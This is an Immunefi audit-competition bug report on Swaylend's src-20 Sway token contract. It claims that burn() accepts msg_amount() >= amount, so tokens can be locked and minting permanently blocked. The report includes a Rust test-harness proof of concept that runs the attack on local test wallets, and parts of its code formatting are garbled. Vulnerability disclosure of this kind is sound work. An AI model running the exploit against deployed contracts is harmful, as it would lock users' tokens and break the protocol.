# #35793 \[SC-High] \`src-20.burn\` should use "==" instead of ">="

**Submitted on Oct 8th 2024 at 14:05:18 UTC by @jasonxiale for** [**IOP | Swaylend**](https://immunefi.com/audit-competition/iop-swaylend)

* **Report ID:** #35793
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/Swaylend/swaylend-monorepo/blob/develop/contracts/src-20/src/main.sw>
* **Impacts:**
  * Block stuffing

## Description

## Brief/Intro

While burning tokens, \`src-20.burn\` checks [msg\_amount() >= amount](https://github.com/Swaylend/swaylend-monorepo/blob/34ada63c18efd163ef80694c404d0573d49d46b4/contracts/src-20/src/main.sw#L153), and updates \`total\_supply\` as \`storage.total\_supply.read() - amount\` in [main.sw#L159-L160](https://github.com/Swaylend/swaylend-monorepo/blob/34ada63c18efd163ef80694c404d0573d49d46b4/contracts/src-20/src/main.sw#L159-L160), and afterwards, \`amount\` of token will be burned in [main.sw#L162](https://github.com/Swaylend/swaylend-monorepo/blob/34ada63c18efd163ef80694c404d0573d49d46b4/contracts/src-20/src/main.sw#L162)

The issue is that

1. The totalSupply is capped by [1\_000\_000\_000\_000\_000\_000u64](https://github.com/Swaylend/swaylend-monorepo/blob/34ada63c18efd163ef80694c404d0573d49d46b4/contracts/src-20/src/main.sw#L23C23-L23C51), which means there will be at most 1\_000\_000\_000\_000\_000\_000u64 amount of token
2. In \`src-20.burn\`, the \`storage.total\_supply\` is subtracted by \`amount\`, and \`amount\` of tokens will be burnt, which means \`amount\` is less than \`msg\_amount()\`, the rest of token will be left in the \`src-20\` contract.

**And because \`src-20\` contract doesn't have any ABI to transfer the token out, the token will be stucked in the contract**

## Vulnerability Details

As shown in the [following code](https://github.com/Swaylend/swaylend-monorepo/blob/34ada63c18efd163ef80694c404d0573d49d46b4/contracts/src-20/src/main.sw#L149-L166): \`\`\`Rust 149 #\[payable] 150 #\[storage(read, write)] 151 fn burn(sub\_id: SubId, amount: u64) { 152 require(sub\_id == DEFAULT\_SUB\_ID, "incorrect-sub-id"); 153 require(msg\_amount() >= amount, "incorrect-amount-provided"); <<<--- Here "==" should be used 154 require( 155 msg\_asset\_id() == AssetId::default(), 156 "incorrect-asset-provided", 157 ); 158 159 let new\_supply = storage.total\_supply.read() - amount; 160 storage.total\_supply.write(new\_supply); 161 162 burn(DEFAULT\_SUB\_ID, amount); 163 164 TotalSupplyEvent::new(AssetId::default(), new\_supply, msg\_sender().unwrap()) 165 .log(); 166 } \`\`\`

## Impact Details

So please consider in a worst situation:

1. The erc-20 owner mints \`MAX\_SUPPLY(1\_000\_000\_000\_000\_000\_000u64)\` amount of token to Alice
2. Alice calls \`erc-20.burn\` with \`amount\` as \`0\`, so all the token will be transferred to \`erc-20\` contract, and will be stucked.
3. The erc-20 owner can't mint any token more, because the \`total\_supply\` has reached its [MAX\_SUPPLY](https://github.com/Swaylend/swaylend-monorepo/blob/34ada63c18efd163ef80694c404d0573d49d46b4/contracts/src-20/src/main.sw#L133-L137)

## References

Add any relevant links to documentation or code

## Proof of Concept

## Proof of Concept

Please create a folder with path \`swaylend-monorepo/contracts/src-20/tests\`, and add the following code into \`swaylend-monorepo/contracts/src-20/tests/harness.rs\`

And run \`\`\`bash cargo test burn\_token -- --nocapture ... running 1 test mint wallet1 1000000000000000000 amount of token wallet\_1 balance: 1000000000000000000 wallet1 burn 1000000000000000000 amount of token wallet\_1 balance: 0 mint wallet1 1 amount of token test burn\_token ... ok

\`\`\`

As shown in the POC, the owner(wallet\_0) first mints wallet\_1 \`1000000000000000000\` amount of token, then wallet\_1 calls \`src-20.burn\` with \`amount\` as 0, and then if the owner tries to mint 1 amount of token, the tx will revert

\`\`\`Rust use fuels::{prelude::\*, types::ContractId}; use fuels::types::{Address, AssetId, Bits256, Bytes32, Identity}; use sha2::{Digest, Sha256};

// Load abi from json abigen!( Contract( name = "SingleAsset", abi = "/opt/swaylend-monorepo/contracts/src-20/out/debug/src-20-abi.json" ) );

\#\[tokio::test] async fn burn\_token() -> Result<()> { let max\_supply = 1\_000\_000\_000\_000\_000\_000u64; let mut wallets = launch\_custom\_provider\_and\_get\_wallets( WalletsConfig::new( Some(5), Some(1), Some(1\_000\_000\_000), /\* Amount per coin \*/ ), None, None, ) .await .unwrap(); let wallet\_0 = wallets.pop().unwrap(); let wallet\_1 = wallets.pop().unwrap();

```
let erc20_id &#x3D; Contract::load_from(
    &quot;/opt/swaylend-monorepo/contracts/src-20/out/debug/src-20.bin&quot;,
    LoadConfiguration::default(),
)
.unwrap()
.deploy(&amp;wallet_0, TxPolicies::default())
.await
.unwrap();

let identity_0   &#x3D; Identity::Address(Address::from(wallet_0.address()));
let erc20_instance &#x3D; SingleAsset::new(erc20_id.clone(), wallet_0.clone());
let erc20_contract_id: ContractId &#x3D; erc20_id.into();

let sub_id &#x3D; Bytes32::from([0u8; 32]);

erc20_instance.methods().constructor(identity_0).call().await?;
let identity_1 &#x3D; Identity::Address(Address::from(wallet_1.address()));

println!(&quot;mint wallet1 {} amount of token&quot;, max_supply);
erc20_instance.clone().with_account(wallet_0.clone()).methods().mint(identity_1, Some(Bits256(*sub_id)), max_supply).with_variable_output_policy(VariableOutputPolicy::Exactly(1)).call().await?;


let asset_id &#x3D; get_asset_id(sub_id, erc20_contract_id);
println!(&quot;wallet_1 balance: {}&quot;, get_wallet_balance(&amp;wallet_1, &amp;asset_id).await);


println!(&quot;wallet1 burn {} amount of token&quot;, max_supply);
let call_params &#x3D; CallParameters::new(max_supply, asset_id, 1_000_000);
erc20_instance.clone().with_account(wallet_1.clone()).methods().burn(Bits256(*sub_id), 0).with_tx_policies(TxPolicies::default().with_script_gas_limit(2_000_000)).call_params(call_params).unwrap().call().await?;

println!(&quot;wallet_1 balance: {}&quot;, get_wallet_balance(&amp;wallet_1, &amp;asset_id).await);

let one &#x3D; 1;
println!(&quot;mint wallet1 {} amount of token&quot;, one);
let burn_res &#x3D; erc20_instance.clone().with_account(wallet_0.clone()).methods().mint(identity_1, Some(Bits256(*sub_id)), one).with_variable_output_policy(VariableOutputPolicy::Exactly(1)).call().await;

assert!(burn_res.is_err());
Ok(())
```

}

pub(crate) fn get\_asset\_id(sub\_id: Bytes32, contract: ContractId) -> AssetId { let mut hasher = Sha256::new(); hasher.update(\*contract); hasher.update(\*sub\_id); AssetId::new(\*Bytes32::from(<\[u8; 32]>::from(hasher.finalize()))) } pub(crate) async fn get\_wallet\_balance(wallet: \&WalletUnlocked, asset: \&AssetId) -> u64 { wallet.get\_asset\_balance(asset).await.unwrap() } \`\`\`
